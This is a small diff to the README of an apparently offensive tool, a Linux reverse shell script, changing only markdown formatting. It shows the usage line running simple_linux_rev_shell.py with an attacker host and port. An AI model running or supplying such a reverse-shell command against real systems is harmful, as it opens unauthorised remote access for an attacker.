@@ -1,8 +1,8 @@
-"Linux Simple"
+#####Linux Simple
 
 Simple shell, usage:
 
-python3 simple_linux_rev_shell.py --host <attacker host> --port <attacker port>
+*python3 simple_linux_rev_shell.py --host <attacker host> --port <attacker port>*
 
 You can also comment args parser and input ip:port in the code.
 
